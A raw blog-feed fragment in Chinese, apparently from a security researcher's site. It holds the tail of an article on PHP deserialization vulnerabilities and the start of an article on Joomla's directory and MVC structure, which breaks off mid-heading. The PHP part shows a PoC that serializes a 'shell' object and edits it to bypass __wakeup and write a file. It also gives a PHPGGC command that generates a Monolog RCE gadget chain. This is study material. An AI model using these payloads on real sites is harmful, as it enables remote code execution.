&#125;</span><br><span class="line">    </span><br><span class="line">$a = <span class="keyword">new</span> Test(<span class="string">'shell'</span>);</span><br><span class="line">$poc = serialize($a);</span><br><span class="line"><span class="keyword">print</span>($poc);</span><br></pre></td></tr></table></figure><p>运行该脚本，我们就获得了我们poc</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15000946064992.jpg" alt=""></p><p>通上文所说道的，在这里需要改两个地方：</p><ul><li>将1改为大于1的任何整数</li><li>将<code>Testpoc</code>改为<code>%00Test%00poc</code></li></ul><p>传入修改后的poc，即可看到：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15000947516393.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15000947623762.jpg" alt=""></p><p>写文件操作执行成功。</p><h1 id="0x05-拓展思路"><a href="#0x05-拓展思路" class="headerlink" title="0x05 拓展思路"></a>0x05 拓展思路</h1><h2 id="1-抛砖引玉——魔法函数可能造成的威胁"><a href="#1-抛砖引玉——魔法函数可能造成的威胁" class="headerlink" title="1. 抛砖引玉——魔法函数可能造成的威胁"></a>1. 抛砖引玉——魔法函数可能造成的威胁</h2><p>刚刚想到这一点的时候准备好好研究一下，没想到p师傅第二天小密圈就放出来这个话题了。接下来顺着这个思路，我们向下深挖一下。</p><h3 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h3><p>经过上面的总结，我们不难看出，PHP中反序列化导致的漏洞中，除了利用PHP本身的漏洞以外，我们通常会寻找<code>__destruct</code>、<code>__wakeup</code>、<code>__toString</code>等方法，看看这些方法中是否有可利用的代码。</p><p>而由于惯性思维，<code>__toString</code>常常被漏洞挖掘者忽略。其实，当反序列化后的对象被输出在模板中的时候（转换成字符串的时候），就可以触发相应的漏洞。</p><p><code>__toString</code>触发条件：</p><ul><li><code>echo ($obj) / print($obj)</code> 打印时会触发</li><li>字符串连接时</li><li>格式化字符串时</li><li>与字符串进行<code>==</code>比较时（PHP进行==比较的时候会转换参数类型）</li><li>格式化SQL语句，绑定参数时</li><li>数组中有字符串时</li></ul><p>我们来写一个demo看一下</p><blockquote><p>toString_demo.php</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">toString_demo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $test1 = <span class="string">'test1'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($test)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test1 = $test;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __destruct() method.</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"__destruct:"</span>;</span><br><span class="line">        <span class="keyword">print</span> <span class="keyword">$this</span>-&gt;test1;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __wakeup() method.</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"__wakeup:"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test1 = <span class="string">"wakeup"</span>;</span><br><span class="line">        <span class="keyword">print</span> <span class="keyword">$this</span>-&gt;test1.<span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __toString() method.</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"__toString:"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test1 = <span class="string">"tosTRING"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;test1.<span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> toString_demo(<span class="string">"demo"</span>);</span><br><span class="line">$b = serialize($a);</span><br><span class="line">$c = unserialize($b);</span><br><span class="line"></span><br><span class="line"><span class="comment">//print "\n".$a."\n";</span></span><br><span class="line"><span class="comment">//print $b."\n";</span></span><br><span class="line"><span class="keyword">print</span> $c;</span><br></pre></td></tr></table></figure><p>执行结果为下：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15001060847306.jpg" alt=""></p><p>通过上面的测试，可以总结以下几点：</p><ul><li><code>echo ($obj) / print($obj)</code> 打印时会触发</li><li><code>__wakeup</code>的优先级&gt;<code>__toString</code>&gt;<code>__destruct</code></li><li>每执行完一个魔法函数，</li></ul><p>接下来从两个方面继续来深入：</p><ul><li>字符串操作</li><li>魔术函数的优先级可能造成的变量覆盖</li></ul><h4 id="字符串操作"><a href="#字符串操作" class="headerlink" title="字符串操作"></a>字符串操作</h4><ul><li><p>字符串拼接：</p><p>  在字符串与反序列化后的对象与字符串进行字符串拼接时，会触发<code>__toString</code>方法。</p><p>  <img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15001078785425.jpg" alt=""></p></li><li><p>字符串函数：</p><p>  经过测试，当反序列化后的最想在经过php字符串函数时，都会执行<code>__toString</code>方法，从这一点我们就可以看出，<code>__toString</code>所可能造成的安全隐患。</p><p>  下面举几个常见的函数作为例子（所使用的类还是上面给出的toString_demo类）：</p><p>  <img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15001086072919.jpg" alt=""></p></li></ul><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15001088645356.jpg" alt=""></p><h4 id="数组操作"><a href="#数组操作" class="headerlink" title="数组操作"></a>数组操作</h4><p>将反序列化后的对象加入到数组中，并不会触发<code>__toString</code>方法：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15001858902513.jpg" alt=""></p><p>但是在<code>in_array()</code>方法中，在数组中有<code>__toString</code>返回的字符串的时候<code>__toString</code>会被调用：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15001890784548.jpg" alt=""></p><h4 id="class-exists"><a href="#class-exists" class="headerlink" title="class_exists"></a>class_exists</h4><p>从<code>in_array()</code>方法中，我们又有了拓展性的想法。我们都知道，在php底层，类似于<code>in_array()</code>这类函数，都属于先执行，之后返回判断结果。那么顺着这个想法，我想到了去年的<a href="http://paper.seebug.org/11/" target="_blank" rel="noopener">IPS Community Suite &lt;= 4.1.12.3 Autoloaded PHP远程代码执行漏洞</a>，这个漏洞中有一个非常有意思的触发点，就是通过<code>class_exists</code>造成相关类的调用，从而触发漏洞。</p><p>通过测试，我们发现了，如果将反序列化后的对象带入<code>class_exists()</code>方法中，同样会造成<code>__toString</code>的执行：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15001897871207.jpg" alt=""></p><h2 id="2-猜想——对象处理过程可能出现的威胁"><a href="#2-猜想——对象处理过程可能出现的威胁" class="headerlink" title="2. 猜想——对象处理过程可能出现的威胁"></a>2. 猜想——对象处理过程可能出现的威胁</h2><p>通过<code>class_exists</code>可能触发的危险操作，继续向下想一下，是否在对象处理过程中也有可能存在漏洞呢？</p><p>还记的去年爆出了一个<a href="https://bugs.php.net/bug.php?id=72433" target="_blank" rel="noopener">PHP GC算法和反序列化机制释放后重用漏洞</a>，是垃圾回收机制本身所出现的问题，在释放与重用的过程中存在的问题。</p><p>顺着这个思路，大家可以继续在对象创建、对象执行、对象销毁方面进行深入的研究。</p><h1 id="0x06-PHPggc"><a href="#0x06-PHPggc" class="headerlink" title="0x06 PHPggc"></a>0x06 PHPggc</h1><p>在0x04的第二节中，我们提到了cms在引用某些依赖库时，可能存在（反）序列化漏洞。那么是否有工具可以生成这些通用型漏洞的测试向量呢？</p><p>当然是存在的。在github上我们找到了<a href="https://github.com/ambionics/phpggc" target="_blank" rel="noopener">PHPggc</a>这个工具，它可以快速的生成主流框架的序列化测试向量。</p><h2 id="关于该测试框架的一点简单的分析"><a href="#关于该测试框架的一点简单的分析" class="headerlink" title="关于该测试框架的一点简单的分析"></a>关于该测试框架的一点简单的分析</h2><h3 id="1-目录结构"><a href="#1-目录结构" class="headerlink" title="1. 目录结构"></a>1. 目录结构</h3><p>目录结构为下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">|- phpggc </span><br><span class="line">|-- gadgetchains    // 相应框架存在漏洞的类以及漏洞利用代码</span><br><span class="line">|-- lib             // 框架调度及核心代码</span><br><span class="line">|-- phpggc          // 入口</span><br><span class="line">|-- README.md</span><br></pre></td></tr></table></figure><h3 id="2-框架运行流程"><a href="#2-框架运行流程" class="headerlink" title="2. 框架运行流程"></a>2. 框架运行流程</h3><p>首先，入口文件为<code>phpggc</code>，直接跟进<code>lib/PHPGGC.php</code>框架核心文件。</p><p>在<code>__construct</code>中完成了当前文件完整路径的获取，以及定义自动加载函数，以实现对于下面的类的实例化操作。</p><p>关键的操作为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;gadgets = <span class="keyword">$this</span>-&gt;get_gadget_chains();</span><br></pre></td></tr></table></figure><p>可以跟进代码看一看，其完成了对于所有payload的加载及保存，将所有的payload进行实例化，并保存在一个全局数组中，以方便调用。</p><p>可以动态跟进，看一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_gadget_chains</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;include_gadget_chains();</span><br><span class="line"></span><br><span class="line">        $classes = get_declared_classes();</span><br><span class="line">        $classes = array_filter($classes, <span class="function"><span class="keyword">function</span><span class="params">($class)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> is_subclass_of($class, <span class="string">'\\PHPGGC\\GadgetChain'</span>) &amp;&amp;</span><br><span class="line">                   strpos($class, <span class="string">'GadgetChain\\'</span>) === <span class="number">0</span>;</span><br><span class="line">        &#125;);</span><br><span class="line">        $objects = array_map(<span class="function"><span class="keyword">function</span><span class="params">($class)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> $class();</span><br><span class="line">        &#125;, $classes);</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Convert backslashes in classes names to forward slashes,</span></span><br><span class="line">        <span class="comment"># so that the command line is easier to use</span></span><br><span class="line">        $classes = array_map(<span class="function"><span class="keyword">function</span><span class="params">($class)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> strtolower(str_replace(<span class="string">'\\'</span>, <span class="string">'/'</span>, $class));</span><br><span class="line">        &#125;, $classes);</span><br><span class="line">        <span class="keyword">return</span> array_combine($classes, $objects);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>跟进<code>include_gadget_chains</code>方法中看一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">include_gadget_chains</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $base = <span class="keyword">$this</span>-&gt;base . <span class="keyword">self</span>::DIR_GADGETCHAINS;</span><br><span class="line">        $files = glob($base . <span class="string">'/*/*/*/chain.php'</span>);</span><br><span class="line">        array_map(<span class="function"><span class="keyword">function</span> <span class="params">($file)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">include_once</span> $file;</span><br><span class="line">        &#125;, $files);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在这边首先获取到当前路径，之后从根目录将其下子目录中的所有<code>chain.php</code>遍历一下，将其路劲存储到<code>$files</code>数组中。接着将数组中的所有<code>chain.php</code>包含一遍，保证之后的调用。</p><p>回到<code>get_gadget_chains</code>接着向下看，将返回所有已定义类的名字所组成的数组，将其定义为<code>$classes</code>，接着将是<code>PHPGGC\GadgetChain</code>子类的类，全部筛选出来（也就是将所有的payload筛选出来），并将其实例化，在其完成格式化后，返回一个由其名与实例化后的类所组成的键值数组。</p><p>到此，完成了最基本框架加载与类的实例化准备。</p><p>跟着运行流程，看到<code>generate</code>方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">generate</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $argv;</span><br><span class="line"></span><br><span class="line">        $parameters = <span class="keyword">$this</span>-&gt;parse_cmdline($argv);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(count($parameters) &lt; <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;help();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $class = array_shift($parameters);</span><br><span class="line">        $gc = <span class="keyword">$this</span>-&gt;get_gadget_chain($class);</span><br><span class="line"></span><br><span class="line">        $parameters = <span class="keyword">$this</span>-&gt;get_type_parameters($gc, $parameters);</span><br><span class="line">        $generated = <span class="keyword">$this</span>-&gt;serialize($gc, $parameters);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span>($generated . <span class="string">"\n"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>代码很简单，一步一步跟着看，首先<code>parse_cmdline</code>完成了对于所选模块及附加参数的解析。</p><p>接下来<code>array_shift</code>完成的操作就是将我们所选的模块从数组中抛出来。</p><p>举个例子，比如我们输入如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./phpggc monolog/rce1 <span class="string">'phpinfo();'</span></span><br></pre></td></tr></table></figure><p>当前的<code>$class</code>为<code>monolog/rce1</code>，看到接下来进入了<code>get_gadget_chain</code>方法中，带着我们参数跟进去看。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_gadget_chain</span><span class="params">($class)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $full = strtolower(<span class="string">'GadgetChain/'</span> . $class);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($full, array_keys(<span class="keyword">$this</span>-&gt;gadgets)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> PHPGGC\<span class="keyword">Exception</span>(<span class="string">'Unknown gadget chain: '</span> . $class);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;gadgets[$full];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>现在的<code>$full</code>为<code>gadgetchain/monolog/rce1</code>，ok，看一下我们全局存储的具有payload的数组：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/14998544938101.jpg" alt=""></p><p>可以很清楚的看到，返回了一个已经实例化完成的<code>GadgetChain\Monolog\RCE1</code>的类。对应的目录则为<code>/gadgetchains/Monolog/RCE/1/chain.php</code></p><p>继续向下，看到将类与参数传入了<code>get_type_parameters</code>，跟进：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">get_type_parameters</span><span class="params">($gc, $parameters)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $arguments = $gc-&gt;parameters;</span><br><span class="line"></span><br><span class="line">        $values = @array_combine($arguments, $parameters);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($values === <span class="keyword">false</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;o($gc, <span class="number">2</span>);</span><br><span class="line">            $arguments = array_map(<span class="function"><span class="keyword">function</span> <span class="params">($a)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'&lt;'</span> . $a . <span class="string">'&gt;'</span>;</span><br><span class="line">            &#125;, $arguments);</span><br><span class="line">            $message = <span class="string">'Invalid arguments for type "'</span> . $gc-&gt;type . <span class="string">'" '</span> . <span class="string">"\n"</span> .</span><br><span class="line">                       <span class="keyword">$this</span>-&gt;_get_command_line($gc-&gt;get_name(), ...$arguments);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> PHPGGC\<span class="keyword">Exception</span>($message);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $values;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>其完成的操作对你想要执行或者写入的代码进行装配，即<code>code</code>标志位与你输入的RCE代码进行键值匹配。若未填写代码，则返回错误，成功则返回相应的数组以便进行payload的序列化。</p><p>看完了这个模块后，再看我们最后的一个模块：将RCE代码进行序列化，完成payload的生成：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span><span class="params">($gc, $parameters)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $gc-&gt;load_gadgets();</span><br><span class="line"></span><br><span class="line">        $parameters = $gc-&gt;pre_process($parameters);</span><br><span class="line">        $payload = $gc-&gt;generate($parameters);</span><br><span class="line">        $payload = <span class="keyword">$this</span>-&gt;wrap($payload);</span><br><span class="line"></span><br><span class="line">        $serialized = serialize($payload);</span><br><span class="line"></span><br><span class="line">        $serialized = $gc-&gt;post_process($serialized);</span><br><span class="line">        $serialized = <span class="keyword">$this</span>-&gt;apply_filters($serialized);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $serialized;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1 id="0x07-结语"><a href="#0x07-结语" class="headerlink" title="0x07 结语"></a>0x07 结语</h1><p>关于PHP（反）序列化漏洞的触发和利用所涉及的东西还有很多，本文只是做一个概括性的描述，抛砖引玉，如有不精确的地方，望大家给予更正。</p><h1 id="0x08-参考资料"><a href="#0x08-参考资料" class="headerlink" title="0x08 参考资料"></a>0x08 参考资料</h1><ol><li><a href="https://www.insomniasec.com/downloads/publications/Practical%20PHP%20Object%20Injection.pdf" target="_blank" rel="noopener">Practical PHP Object Injection</a></li><li><a href="http://bobao.360.cn/learning/detail/3020.html" target="_blank" rel="noopener">SugarCRM 6.5.23 - REST PHP Object Injection漏洞分析</a></li><li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7124" target="_blank" rel="noopener">CVE-2016-7124</a></li><li><a href="https://github.com/ambionics/phpggc" target="_blank" rel="noopener">PHPGGC</a></li><li><a href="http://lucifaer.com/index.php/archives/17/">关于PHP中的自动加载类</a></li><li><a href="http://t.xiaomiquan.com/zJ6Y7Mf" target="_blank" rel="noopener">Phith0n小密圈的主题</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本篇文章为针对PHP反序列化漏洞的介绍与分析。&lt;br&gt;
    
    </summary>
    
      <category term="安全研究" scheme="https://lucifaer.com/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="PHP" scheme="https://lucifaer.com/tags/PHP/"/>
    
      <category term="安全研究" scheme="https://lucifaer.com/tags/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"/>
    
  </entry>
  
  <entry>
    <title>Joomla 框架的简单跟进</title>
    <link href="https://lucifaer.com/2017/05/27/Joomla%20%E6%A1%86%E6%9E%B6%E7%9A%84%E7%AE%80%E5%8D%95%E8%B7%9F%E8%BF%9B/"/>
    <id>https://lucifaer.com/2017/05/27/Joomla 框架的简单跟进/</id>
    <published>2017-05-27T02:03:00.000Z</published>
    <updated>2018-11-29T09:47:31.000Z</updated>
    
    <content type="html"><![CDATA[<p>最近爆出的Joomla!3.7.0 Core SQL注入漏洞，在分析的时候难免会接触到一些框架本身调用的问题。本着知根知底的想法，我开始了对Joomla框架的简单跟进。</p><p>PS：本人小菜一个，本篇很大程度上是基于本人对代码的跟踪、总结而写的，可能有很多地方不是很准确，希望大牛们勿喷，多给予一些分享。</p><a id="more"></a><h1 id="0x00-文件目录介绍"><a href="#0x00-文件目录介绍" class="headerlink" title="0x00 文件目录介绍"></a>0x00 文件目录介绍</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"># 目录</span><br><span class="line">administrator/   # 管理后台目录</span><br><span class="line">bin/             # 该文件夹存放一些基于Joomla框架开发的一些实用的脚本</span><br><span class="line">cache/           # 文件缓存目录</span><br><span class="line">cli/             # 该文件夹存放一些终端使用的命令，用于操作当前的站点</span><br><span class="line">components/      # Joomla组件目录</span><br><span class="line">images/          # 网站内容使用的媒体文件目录，后台有对此文件夹进行管理的功能</span><br><span class="line">includes/        # 运行Joomla需要包含的基础文件</span><br><span class="line">language/        # 语言目录，多语言的翻译都存放在这里</span><br><span class="line">layouts/         # 应该是控制布局的，没有注意过是哪个版本加上的，也没研究过，等有时间了研究一下再写</span><br><span class="line">libraries/       # Joomla使用的库文件</span><br><span class="line">logs/            # 日志目录，一些异常处理都会存放在这个文件夹里，例如后台登录时输入错误的用户名和密码</span><br><span class="line">media/           # Joomla使用到的媒体文件，主要是页面渲染会用到的，存放的内容跟images目录有区别，而且后台是没有对其进行管理的功能的</span><br><span class="line">modules/         # Joomla模块目录</span><br><span class="line">plugins/         # Joomla插件目录</span><br><span class="line">templates/       # Joomla站点模板目录</span><br><span class="line">tmp/             # 临时目录，如安装组件或模块时残留的解压文件等</span><br><span class="line"> </span><br><span class="line"># 文件</span><br><span class="line">configuration.php   # Joomla配置文件</span><br><span class="line">htaccess.txt        # 帮助我们生成.htaccess</span><br><span class="line">index.php           # Joomla单入口文件</span><br><span class="line">LICENSE.txt         # 不多叙述</span><br><span class="line">README.txt          # 不多叙述</span><br><span class="line">robots.txt          # 搜索引擎爬行使用的文件</span><br><span class="line">web.config.txt      # 据说是IIS使用的文件</span><br></pre></td></tr></table></figure><h1 id="0x01-Joomla的MVC"><a href="#0x01-Joomla的MVC" class="headerlink" title="0x01 Joomla的MVC"></a>0x01 Joomla的MVC</h1><p>在Joomla中并不像国内的一些cms一样，主要功能的实现放在组件中，下面就说一说Joomla中的四个非常重要的东西：组件、模块、控制器、视图。</p><h2 id="1-组件"><a href="#1-组件" class="headerlink" title="1. 组件"></a>1. 组件</h2><p>在Joomla中，组件可以说是最大的功能模块。一个组件分为两部分：前台和后台。后台主要用于对对应内容的管理，前台主要用于前台页面的呈现和响应各种操作。其文件目录分别对应于<code>joomla/administrator/components</code>和<code>joomla/components</code>。组件有自己的命名规则，文件夹名须命名为<code>com_组件名</code>，组件的访问也是单文件入口，入口文件为<code>com_组件名/组件名.php</code>。如<code>components/com_content/content.php</code>。</p><p>以<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">其中`option=com_content&amp;view=article&amp;id=7`，它会先调用`content.php`，再由`router.php`路由到`article`视图，再调用相应的Model层取出ID=7的分类信息，渲染之后呈现在模板中的`jdoc:include type=”component`位置上。</span><br><span class="line"></span><br><span class="line">## 2. 模块</span><br><span class="line"></span><br><span class="line">与组件（Component）不同的是，模块（Module）是不能通过URL直接访问的，而是通过后台对模块的设置，根据菜单ID（URL中的Itemid）来判断当前页面应该加载哪些模块。所以它主要用于显示内容，而一些表单提交后的处理动作一般是放在组件中去处理的。因此，模块通常都是比较简单的程序，文件结构也很清晰易懂，如modules/mod_login模块中的文件结构如下：</span><br></pre></td></tr></table></figure></p><p>mod_login.xml            # 模块配置及安装使用的文件<br>mod_login.php            # 模块入口文件，以mod_模块名.php命名，可以看作Controller层<br>helper.php               # 辅助文件，通常数据操作会放在这里，可以看作Model层<br>tmpl/                    # 模p板文件夹，View层<br>|_ default.php           # 默认模板<br>|_ default_logout.php    # 退出登录模板<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 2.1 模块调用的另外一个参数</span><br><span class="line"></span><br><span class="line">在模板的首页文件中，我们会看到调用模块时有如下代码</span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line">jdoc:include type=&quot;modules&quot; name=&quot;position-7&quot; style=&quot;well&quot;</span><br></pre></td></tr></table></figure></p><p>这里多了一个style参数，这个其实是一个显示前的预处理动作，在当前模板文件夹中的html/modules.php中定义，打开这个文件我们就能看到有一个modChrome_well的函数，程序不是很复杂，只是在显示前对html做了下预处理。</p><h3 id="2-2-模块的另外一种调用方法"><a href="#2-2-模块的另外一种调用方法" 